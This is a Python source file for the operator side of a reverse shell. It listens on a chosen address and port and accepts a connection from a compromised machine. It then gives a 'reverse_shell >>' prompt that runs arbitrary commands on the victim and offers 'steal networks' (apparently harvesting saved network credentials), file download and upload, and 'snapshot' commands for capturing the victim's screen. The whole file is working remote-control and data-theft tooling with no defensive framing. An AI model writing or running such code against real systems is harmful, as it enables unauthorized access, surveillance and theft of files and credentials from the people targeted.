import socket
import argparse


# Prepare the cmd parser for CLI
def set_cmd_parser() -> argparse.ArgumentParser:
    parser: argparse.ArgumentParser = argparse.ArgumentParser()
    parser.add_argument('LHOST', type=str, help="REQUIRED : The address you want to listen on for incoing connections. 0.0.0.0 or 127.0.0.1 are recommended")
    parser.add_argument('LPORT', type=int, help="REQUIRED : The port you want to listen on for incoming connections")
    return parser


# Initialize Constants
PARSER: argparse.ArgumentParser = set_cmd_parser()
PARSER_RESULTS: argparse.Namespace = PARSER.parse_args()

BUFSIZ: int = 5000
LISTENER_IP: str = PARSER_RESULTS.LHOST
PORT: int = PARSER_RESULTS.LPORT
FORMAT: str = "utf-8"
ADDRESS: tuple = (LISTENER_IP, PORT)

# INITIALIZING SOCKET
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDRESS)

def main():
    server.listen(1)
    print(f"Listening on {LISTENER_IP} {PORT}")
    connection, address = server.accept()
    print(f"Established new connection: [ADDRESS] {address[0]} [PORT] {PORT}")
    while True:
        command: str = input("reverse_shell >>")
        command = command.strip()
        if "steal networks" == command:
            connection.send(command.encode(FORMAT))
            response: str = connection.recv(BUFSIZ).decode(FORMAT)
            if response == "success":
                print("Networks gathered successfully")
            else:
                print("Something went wrong")

        elif command.split(" ", 1)[0] == "download":
            if len(command.split(" ", 1)) == 2:
                connection.send(command.encode(FORMAT))
                # If the file is not found, print that and dont move to other lines
                if connection.recv(BUFSIZ).decode(FORMAT) == "File found":
                    filename: str = connection.recv(BUFSIZ).decode(FORMAT)
                    connection.send("filename received".encode(FORMAT))
                    file_header = connection.recv(BUFSIZ).decode(FORMAT)
                    connection.send("file header received".encode(FORMAT))
                    file_bytes = connection.recv(int(file_header))
                    new_file = open(filename, "wb")
                    new_file.write(file_bytes)
                    new_file.close()
                    print("Downloaded Successfully")
                else:
                    print("File Not Found")
            else:
                print("Wrong Syntax") 

        elif command.split(" ", 1)[0] == "upload":
            if len(command.split(" ", 1)) == 2:
                filename = command.split(" ", 1)[1].strip()
                try:
                    target_file = open(filename, "rb")
                    connection.send(command.encode(FORMAT))
                    file_bytes: bytes = target_file.read()
                    file_header = str(len(file_bytes)).encode(FORMAT)
                    connection.send(filename.encode(FORMAT))
                    if connection.recv(BUFSIZ).decode(FORMAT) == "filename received":
                        connection.send(file_header)
                        if connection.recv(BUFSIZ).decode(FORMAT) == "file header received":
                            connection.send(file_bytes)
                    target_file.close()
                    if connection.recv(BUFSIZ).decode(FORMAT) == "success":
                        print("Uploaded Successfully")
                    else:
                        print("Upload failed")
                except BaseException:
                    print("File Not Found.")
            else:
                print("Wrong syntax")

        elif command == "snapshot":
            connection.send(command.encode(FORMAT))
            if connection.recv(BUFSIZ).decode(FORMAT) == "success":
                print("Snapshot taken successfully.")
            else:
                print("Snapshot failed")
        
        elif command == "exit":
            connection.send(command.encode(FORMAT))
            connection.close()
            break

        else:
            if command:
                connection.send(command.encode(FORMAT))
                output: str = connection.recv(BUFSIZ).decode(FORMAT)
                print(output)       
            else: 
                pass



if __name__ == "__main__":
    main()

